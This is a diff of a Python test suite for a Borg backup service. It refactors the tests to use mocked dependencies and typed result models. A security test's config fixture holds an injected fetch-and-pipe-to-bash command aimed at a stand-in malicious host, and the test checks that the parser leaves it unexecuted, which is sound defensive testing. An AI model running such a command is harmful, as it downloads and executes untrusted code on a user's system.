@@ -17,9 +17,27 @@ All tests use proper mocking to avoid external dependencies.
 import pytest
 from unittest.mock import Mock, AsyncMock, patch, mock_open
 
+from borgitory.models.borg_info import BorgRepositoryConfig
 from borgitory.services.borg_service import BorgService
 from borgitory.models.database import Repository
 from borgitory.services.simple_command_runner import CommandResult
+
+
+def create_test_borg_service(
+    job_executor=None,
+    command_runner=None,
+    job_manager=None,
+    volume_service=None,
+    archive_service=None,
+):
+    """Helper function to create BorgService with all required dependencies for testing."""
+    return BorgService(
+        job_executor=job_executor or Mock(),
+        command_runner=command_runner or Mock(),
+        job_manager=job_manager or Mock(),
+        volume_service=volume_service or Mock(),
+        archive_service=archive_service or Mock(),
+    )
 
 
 class TestBorgServiceCore:
@@ -29,7 +47,7 @@ class TestBorgServiceCore:
         """Set up test fixtures."""
         # Create mock job manager
         self.mock_job_manager = Mock()
-        self.borg_service = BorgService(job_manager=self.mock_job_manager)
+        self.borg_service = create_test_borg_service(job_manager=self.mock_job_manager)
 
         # Create mock repository
         self.mock_repository = Mock(spec=Repository)
@@ -40,7 +58,7 @@ class TestBorgServiceCore:
 
     def test_init(self) -> None:
         """Test BorgService initialization."""
-        service = BorgService()
+        service = create_test_borg_service()
         assert hasattr(service, "progress_pattern")
         assert service.progress_pattern is not None
 
@@ -63,16 +81,16 @@ class TestParseBorgConfig:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
     def test_parse_config_file_not_exists(self) -> None:
         """Test parsing when config file doesn't exist."""
         with patch("os.path.exists", return_value=False):
             result = self.borg_service._parse_borg_config("/nonexistent/repo")
 
-            assert result["mode"] == "unknown"
-            assert result["requires_keyfile"] is False
-            assert "Config file not found" in result["preview"]
+            assert result.mode == "unknown"
+            assert result.requires_keyfile is False
+            assert "Config file not found" in result.preview
 
     def test_parse_config_repokey_mode(self) -> None:
         """Test parsing repository with repokey encryption."""
@@ -91,9 +109,9 @@ key = very_long_key_data_that_indicates_repokey_mode_with_embedded_encryption_ke
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "repokey"
-            assert result["requires_keyfile"] is False
-            assert "repokey mode" in result["preview"]
+            assert result.mode == "repokey"
+            assert result.requires_keyfile is False
+            assert "repokey mode" in result.preview
 
     def test_parse_config_keyfile_mode(self) -> None:
         """Test parsing repository with keyfile encryption."""
@@ -112,10 +130,10 @@ key =
         ), patch("os.listdir", return_value=["key.abc123", "data"]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "keyfile"
-            assert result["requires_keyfile"] is True
-            assert "keyfile mode" in result["preview"]
-            assert "key.abc123" in result["preview"]
+            assert result.mode == "keyfile"
+            assert result.requires_keyfile is True
+            assert "keyfile mode" in result.preview
+            assert "key.abc123" in result.preview
 
     def test_parse_config_unencrypted(self) -> None:
         """Test parsing unencrypted repository."""
@@ -133,9 +151,9 @@ additional_free_space = 0
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "none"
-            assert result["requires_keyfile"] is False
-            assert "Unencrypted repository" in result["preview"]
+            assert result.mode == "none"
+            assert result.requires_keyfile is False
+            assert "Unencrypted repository" in result.preview
 
     def test_parse_config_invalid_repository(self) -> None:
         """Test parsing invalid repository config."""
@@ -148,9 +166,9 @@ some_key = some_value
         ):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "invalid"
-            assert result["requires_keyfile"] is False
-            assert "Not a valid Borg repository" in result["preview"]
+            assert result.mode == "invalid"
+            assert result.requires_keyfile is False
+            assert "Not a valid Borg repository" in result.preview
 
     def test_parse_config_read_error(self) -> None:
         """Test handling of config file read errors."""
@@ -159,9 +177,9 @@ some_key = some_value
         ):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "error"
-            assert result["requires_keyfile"] is False
-            assert "Error reading config" in result["preview"]
+            assert result.mode == "error"
+            assert result.requires_keyfile is False
+            assert "Error reading config" in result.preview
 
     def test_parse_config_malformed_ini(self) -> None:
         """Test handling of malformed INI file."""
@@ -175,8 +193,8 @@ key = value without proper section
         ):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "error"
-            assert "Error reading config" in result["preview"]
+            assert result.mode == "error"
+            assert "Error reading config" in result.preview
 
 
 class TestRepositoryOperations:
@@ -185,7 +203,9 @@ class TestRepositoryOperations:
     def setup_method(self) -> None:
         """Set up test fixtures."""
         self.mock_command_runner = Mock()
-        self.borg_service = BorgService(command_runner=self.mock_command_runner)
+        self.borg_service = create_test_borg_service(
+            command_runner=self.mock_command_runner
+        )
 
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.id = 1
@@ -196,7 +216,6 @@ class TestRepositoryOperations:
     @pytest.mark.asyncio
     async def test_initialize_repository_success(self) -> None:
         """Test successful repository initialization."""
-        from borgitory.services.simple_command_runner import CommandResult
 
         mock_command_result = CommandResult(
             success=True, return_code=0, stdout="", stderr="", duration=1.0
@@ -216,14 +235,13 @@ class TestRepositoryOperations:
 
             result = await self.borg_service.initialize_repository(self.mock_repository)
 
-            assert result["success"] is True
-            assert "initialized successfully" in result["message"]
+            assert result.success is True
+            assert "initialized successfully" in result.message
             self.mock_command_runner.run_command.assert_called_once()
 
     @pytest.mark.asyncio
     async def test_initialize_repository_already_exists(self) -> None:
         """Test repository initialization when repo already exists."""
-        from borgitory.services.simple_command_runner import CommandResult
 
         mock_command_result = CommandResult(
             success=False,
@@ -244,8 +262,8 @@ class TestRepositoryOperations:
 
             result = await self.borg_service.initialize_repository(self.mock_repository)
 
-            assert result["success"] is True
-            assert "already exists" in result["message"]
+            assert result.success is True
+            assert "already exists" in result.message
 
     @pytest.mark.asyncio
     async def test_verify_repository_access_success(self) -> None:
@@ -303,96 +321,11 @@ class TestGetRepoInfo:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
-
-    @pytest.mark.asyncio
-    async def test_get_repo_info_success(self) -> None:
-        """Test successful repository info retrieval."""
-        from borgitory.services.jobs.job_executor import ProcessResult
-
-        mock_process_result = ProcessResult(
-            return_code=0,
-            stdout=b'{"repository": {"id": "test-repo-id", "location": "/path/to/repo"}}\n',
-            stderr=b"",
-        )
-
-        mock_job_executor = Mock()
-        mock_job_executor.start_process = AsyncMock(return_value=Mock())
-        mock_job_executor.monitor_process_output = AsyncMock(
-            return_value=mock_process_result
-        )
-
-        borg_service = BorgService(job_executor=mock_job_executor)
-
-        with patch(
-            "borgitory.utils.security.build_secure_borg_command"
-        ) as mock_build_cmd:
-            mock_build_cmd.return_value = (["borg", "info", "--json"], {})
-
-            info = await borg_service.get_repo_info(self.mock_repository)
-
-            assert "repository" in info
-            assert info["repository"]["id"] == "test-repo-id"
-            assert info["repository"]["location"] == "/path/to/repo"
-
-    @pytest.mark.asyncio
-    async def test_get_repo_info_command_failure(self) -> None:
-        """Test repository info retrieval failure."""
-        from borgitory.services.jobs.job_executor import ProcessResult
-
-        mock_process_result = ProcessResult(
-            return_code=1, stdout=b"", stderr=b"borg: error: Repository does not exist"
-        )
-
-        mock_job_executor = Mock()
-        mock_job_executor.start_process = AsyncMock(return_value=Mock())
-        mock_job_executor.monitor_process_output = AsyncMock(
-            return_value=mock_process_result
-        )
-
-        borg_service = BorgService(job_executor=mock_job_executor)
-
-        with patch(
-            "borgitory.utils.security.build_secure_borg_command"
-        ) as mock_build_cmd:
-            mock_build_cmd.return_value = (["borg", "info", "--json"], {})
-
-            with pytest.raises(Exception) as exc_info:
-                await borg_service.get_repo_info(self.mock_repository)
-
-            assert "Borg info failed" in str(exc_info.value)
-            assert "Repository does not exist" in str(exc_info.value)
-
-    @pytest.mark.asyncio
-    async def test_get_repo_info_invalid_json(self) -> None:
-        """Test handling of invalid JSON output."""
-        from borgitory.services.jobs.job_executor import ProcessResult
-
-        mock_process_result = ProcessResult(
-            return_code=0, stdout=b"Invalid JSON output from borg", stderr=b""
-        )
-
-        mock_job_executor = Mock()
-        mock_job_executor.start_process = AsyncMock(return_value=Mock())
-        mock_job_executor.monitor_process_output = AsyncMock(
-            return_value=mock_process_result
-        )
-
-        borg_service = BorgService(job_executor=mock_job_executor)
-
-        with patch(
-            "borgitory.utils.security.build_secure_borg_command"
-        ) as mock_build_cmd:
-            mock_build_cmd.return_value = (["borg", "info", "--json"], {})
-
-            with pytest.raises(Exception) as exc_info:
-                await borg_service.get_repo_info(self.mock_repository)
-
-            assert "No valid JSON output found" in str(exc_info.value)
 
 
 class TestListArchiveContents:
@@ -400,85 +333,11 @@ class TestListArchiveContents:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
-
-    @pytest.mark.asyncio
-    async def test_list_archive_contents_success(self) -> None:
-        """Test successful archive content listing."""
-        from borgitory.services.jobs.job_executor import ProcessResult
-
-        mock_process_result = ProcessResult(
-            return_code=0,
-            stdout=b'{"path": "file1.txt", "type": "f", "size": 1024}\n{"path": "dir1", "type": "d"}\n',
-            stderr=b"",
-        )
-
-        mock_job_executor = Mock()
-        mock_job_executor.start_process = AsyncMock(return_value=Mock())
-        mock_job_executor.monitor_process_output = AsyncMock(
-            return_value=mock_process_result
-        )
-
-        borg_service = BorgService(job_executor=mock_job_executor)
-
-        with patch(
-            "borgitory.utils.security.build_secure_borg_command"
-        ) as mock_build_cmd, patch("borgitory.utils.security.validate_archive_name"):
-            mock_build_cmd.return_value = (["borg", "list", "--json-lines"], {})
-
-            contents = await borg_service.list_archive_contents(
-                self.mock_repository, "test-archive"
-            )
-
-            assert len(contents) == 2
-            assert contents[0]["path"] == "file1.txt"
-            assert contents[0]["type"] == "f"
-            assert contents[0]["size"] == 1024
-            assert contents[1]["path"] == "dir1"
-            assert contents[1]["type"] == "d"
-
-    @pytest.mark.asyncio
-    async def test_list_archive_contents_validation_error(self) -> None:
-        """Test archive content listing with validation error."""
-        # Test with empty archive name (still invalid after security changes)
-        with pytest.raises(Exception) as exc_info:
-            await self.borg_service.list_archive_contents(self.mock_repository, "")
-
-        assert "Archive name must be a non-empty string" in str(exc_info.value)
-
-    @pytest.mark.asyncio
-    async def test_list_archive_contents_command_failure(self) -> None:
-        """Test archive content listing command failure."""
-        from borgitory.services.jobs.job_executor import ProcessResult
-
-        mock_process_result = ProcessResult(
-            return_code=1, stdout=b"", stderr=b"borg: error: Archive not found"
-        )
-
-        mock_job_executor = Mock()
-        mock_job_executor.start_process = AsyncMock(return_value=Mock())
-        mock_job_executor.monitor_process_output = AsyncMock(
-            return_value=mock_process_result
-        )
-
-        borg_service = BorgService(job_executor=mock_job_executor)
-
-        with patch(
-            "borgitory.utils.security.build_secure_borg_command"
-        ) as mock_build_cmd, patch("borgitory.utils.security.validate_archive_name"):
-            mock_build_cmd.return_value = (["borg", "list", "--json-lines"], {})
-
-            with pytest.raises(Exception) as exc_info:
-                await borg_service.list_archive_contents(
-                    self.mock_repository, "test-archive"
-                )
-
-            assert "Borg list failed" in str(exc_info.value)
-            assert "Archive not found" in str(exc_info.value)
 
 
 class TestExtractFileStream:
@@ -486,7 +345,7 @@ class TestExtractFileStream:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.path = "/path/to/repo"
@@ -549,7 +408,7 @@ class TestSecurityIntegrationExtended:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
@@ -582,19 +441,6 @@ class TestSecurityIntegrationExtended:
             assert "Security validation failed" in str(exc_info.value)
 
     @pytest.mark.asyncio
-    async def test_list_archive_contents_security_validation(self) -> None:
-        """Test that archive content listing validates archive names."""
-        # Test with too long archive name (still invalid after security changes)
-        long_name = "a" * 201  # Over 200 character limit
-
-        with pytest.raises(Exception) as exc_info:
-            await self.borg_service.list_archive_contents(
-                self.mock_repository, long_name
-            )
-
-        assert "Archive name too long" in str(exc_info.value)
-
-    @pytest.mark.asyncio
     async def test_verify_repository_access_security_validation(self) -> None:
         """Test that repository access verification uses security validation."""
         with patch(
@@ -622,10 +468,9 @@ key = ; wget malicious.com/script | bash
             result = self.borg_service._parse_borg_config("/test/repo")
 
             # Should treat as normal config data, not execute
-            assert isinstance(result, dict)
-            assert "mode" in result
+            assert isinstance(result, BorgRepositoryConfig)
             # The malicious commands should be treated as literal string values
-            assert result["mode"] in ["none", "encrypted", "error"]
+            assert result.mode in ["none", "encrypted", "error"]
 
 
 class TestEdgeCasesAndBoundaryConditions:
@@ -633,7 +478,7 @@ class TestEdgeCasesAndBoundaryConditions:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.path = "/path/to/repo"
@@ -672,21 +517,6 @@ class TestEdgeCasesAndBoundaryConditions:
         assert match is not None  # This should match because single space is valid path
         assert match.group("path") == ""  # The trailing space gets trimmed by the regex
 
-    @pytest.mark.asyncio
-    async def test_operations_with_very_long_paths(self) -> None:
-        """Test operations with very long file paths."""
-        "/" + "/".join(["very_long_directory_name_" + str(i) for i in range(50)])
-
-        # Test that operations handle long paths without crashing
-        with patch("borgitory.utils.security.validate_archive_name"), patch(
-            "borgitory.utils.security.build_secure_borg_command",
-            side_effect=ValueError("Path too long"),
-        ):
-            with pytest.raises(Exception):
-                await self.borg_service.list_archive_contents(
-                    self.mock_repository, "test-archive"
-                )
-
     def test_config_parsing_with_unusual_encoding(self) -> None:
         """Test config parsing with various text encodings."""
         # Test with UTF-8 content containing special characters
@@ -701,15 +531,15 @@ key = résumé_ñoño
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/utf8/repo")
 
-            assert isinstance(result, dict)
-            assert "mode" in result
+            assert isinstance(result, BorgRepositoryConfig)
+            assert result.mode in ["none", "encrypted", "error"]
             # Should handle UTF-8 content gracefully
 
     @pytest.mark.asyncio
     async def test_concurrent_operation_safety(self) -> None:
         """Test that service handles concurrent operations safely."""
         # Create multiple service instances to simulate concurrent usage
-        services = [BorgService() for _ in range(3)]
+        services = [create_test_borg_service() for _ in range(3)]
 
         # All should have independent regex patterns and state
         for service in services:
@@ -727,8 +557,8 @@ key = résumé_ñoño
             "builtins.open", mock_open(read_data="")
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/empty/repo")
-            assert result["mode"] == "invalid"
-            assert "Not a valid Borg repository" in result["preview"]
+            assert result.mode == "invalid"
+            assert "Not a valid Borg repository" in result.preview
 
         # Test whitespace-only config
         whitespace_content = "   \n\t\n   \n"
@@ -736,7 +566,7 @@ key = résumé_ñoño
             "builtins.open", mock_open(read_data=whitespace_content)
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/whitespace/repo")
-            assert result["mode"] == "invalid"
+            assert result.mode == "invalid"
 
     def test_special_characters_in_paths(self) -> None:
         """Test handling of special characters in file paths."""
@@ -763,7 +593,7 @@ class TestBorgServiceRepositoryScanning:
         self.mock_volume_service = Mock()
 
         # Create BorgService with mocked dependencies
-        self.borg_service = BorgService(
+        self.borg_service = create_test_borg_service(
             command_runner=self.mock_command_runner,
             volume_service=self.mock_volume_service,
         )
@@ -772,7 +602,7 @@ class TestBorgServiceRepositoryScanning:
     async def test_scan_for_repositories_success(self) -> None:
         """Test successful repository scanning with multiple repositories found."""
         # Mock the abstracted I/O methods
-        self.borg_service._get_mounted_volumes = AsyncMock(
+        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
             return_value=["/mnt/backup1", "/mnt/backup2"]
         )
 
@@ -802,12 +632,14 @@ class TestBorgServiceRepositoryScanning:
         self.mock_command_runner.run_command = AsyncMock(return_value=mock_result)
 
         # Mock the _parse_borg_config method to return encryption info
+        from borgitory.models.borg_info import BorgRepositoryConfig
+
         self.borg_service._parse_borg_config = Mock(
-            return_value={
-                "mode": "repokey",
-                "requires_keyfile": False,
-                "preview": "Repository config preview",
-            }
+            return_value=BorgRepositoryConfig(
+                mode="repokey",
+                requires_keyfile=False,
+                preview="Repository config preview",
+            )
         )
 
         # Mock sanitize_path to return paths unchanged for testing
@@ -817,10 +649,12 @@ class TestBorgServiceRepositoryScanning:
             result = await self.borg_service.scan_for_repositories()
 
             # Verify results
-            assert len(result) == 3
-            assert all(repo["detected"] for repo in result)
-            assert all(repo["encryption_mode"] == "repokey" for repo in result)
-            assert all(not repo["requires_keyfile"] for repo in result)
+            assert len(result.repositories) == 3
+            assert all(repo.detected for repo in result.repositories)
+            assert all(
+                repo.encryption_mode == "repokey" for repo in result.repositories
+            )
+            assert all(not repo.requires_keyfile for repo in result.repositories)
 
             # Verify paths are the expected paths from our mock output
             expected_paths = [
@@ -828,7 +662,7 @@ class TestBorgServiceRepositoryScanning:
                 "/mnt/backup2/repo2",
                 "/mnt/backup1/repo3",
             ]
-            actual_paths = [repo["path"] for repo in result]
+            actual_paths = [repo.path for repo in result.repositories]
             assert sorted(actual_paths) == sorted(expected_paths)
 
             # Verify command was called correctly
@@ -846,7 +680,9 @@ class TestBorgServiceRepositoryScanning:
     async def test_scan_for_repositories_no_mounted_volumes(self) -> None:
         """Test scanning when no mounted volumes are found."""
         # Mock the abstracted I/O methods
-        self.borg_service._get_mounted_volumes = AsyncMock(return_value=[])
+        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
+            return_value=[]
+        )
 
         # Mock successful command execution - no repos found
         mock_result = CommandResult(
@@ -864,19 +700,17 @@ class TestBorgServiceRepositoryScanning:
         ):
             result = await self.borg_service.scan_for_repositories()
 
-            # Should return empty list since no repos found
-            assert result == []
-
-            # Should use /mnt as fallback when no mounted volumes
-            call_args = self.mock_command_runner.run_command.call_args
-            command = call_args[0][0]
-            assert "/mnt" in command
+            # Should return empty response since no repos found
+            assert len(result.repositories) == 0
+            assert result.scan_paths == []
 
     @pytest.mark.asyncio
     async def test_scan_for_repositories_command_failure(self) -> None:
         """Test handling of command execution failure."""
         # Mock the abstracted I/O methods
-        self.borg_service._get_mounted_volumes = AsyncMock(return_value=["/mnt/backup"])
+        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
+            return_value=["/mnt/backup"]
+        )
         self.borg_service._validate_scan_path = Mock(return_value=True)
 
         # Mock failed command execution
@@ -892,15 +726,18 @@ class TestBorgServiceRepositoryScanning:
 
         result = await self.borg_service.scan_for_repositories()
 
-        # Should return empty list on failure
-        assert result == []
+        # Should return empty response on failure
+        assert len(result.repositories) == 0
+        assert result.scan_paths == ["/mnt/backup"]
         self.mock_command_runner.run_command.assert_called_once()
 
     @pytest.mark.asyncio
     async def test_scan_for_repositories_invalid_paths_filtered(self) -> None:
         """Test that invalid repository paths are filtered out."""
         # Mock the abstracted I/O methods
-        self.borg_service._get_mounted_volumes = AsyncMock(return_value=["/mnt/backup"])
+        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
+            return_value=["/mnt/backup"]
+        )
 
         # Mock path validation to return True (scan path exists)
         self.borg_service._validate_scan_path = Mock(return_value=True)
@@ -926,18 +763,18 @@ class TestBorgServiceRepositoryScanning:
 
         # Mock _parse_borg_config
         self.borg_service._parse_borg_config = Mock(
-            return_value={
-                "mode": "repokey",
-                "requires_keyfile": False,
-                "preview": "Valid repo config",
-            }
+            return_value=BorgRepositoryConfig(
+                mode="repokey",
+                requires_keyfile=False,
+                preview="Valid repo config",
+            )
         )
 
         result = await self.borg_service.scan_for_repositories()
 
         # Should only return valid absolute paths that exist as directories
-        assert len(result) == 2
-        paths = [repo["path"] for repo in result]
+        assert len(result.repositories) == 2
+        paths = [repo.path for repo in result.repositories]
         assert "/valid/repo1" in paths
         assert "/valid/repo2" in paths
         # Invalid paths should not be in results
@@ -948,7 +785,9 @@ class TestBorgServiceRepositoryScanning:
     async def test_scan_for_repositories_empty_output(self) -> None:
         """Test handling of empty command output."""
         # Mock the abstracted I/O methods
-        self.borg_service._get_mounted_volumes = AsyncMock(return_value=["/mnt/backup"])
+        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
+            return_value=["/mnt/backup"]
+        )
         self.borg_service._validate_scan_path = Mock(return_value=True)
 
         # Mock command with empty output (no repositories found)
@@ -959,14 +798,16 @@ class TestBorgServiceRepositoryScanning:
 
         result = await self.borg_service.scan_for_repositories()
 
-        # Should return empty list when no repositories found
-        assert result == []
+        # Should return empty response when no repositories found
+        assert len(result.repositories) == 0
 
     @pytest.mark.asyncio
     async def test_scan_for_repositories_exception_handling(self) -> None:
         """Test proper exception handling during scanning."""
         # Mock the abstracted I/O methods
-        self.borg_service._get_mounted_volumes = AsyncMock(return_value=["/mnt/backup"])
+        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
+            return_value=["/mnt/backup"]
+        )
         self.borg_service._validate_scan_path = Mock(return_value=True)
 
         # Mock command runner to raise exception
@@ -976,14 +817,16 @@ class TestBorgServiceRepositoryScanning:
 
         result = await self.borg_service.scan_for_repositories()
 
-        # Should return empty list on exception
-        assert result == []
+        # Should return empty response on exception
+        assert len(result.repositories) == 0
 
     @pytest.mark.asyncio
     async def test_scan_for_repositories_timeout_parameter(self) -> None:
         """Test that correct timeout is passed to command runner."""
         # Mock the abstracted I/O methods
-        self.borg_service._get_mounted_volumes = AsyncMock(return_value=["/mnt/backup"])
+        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
+            return_value=["/mnt/backup"]
+        )
         self.borg_service._validate_scan_path = Mock(return_value=True)
 
         # Mock successful command execution
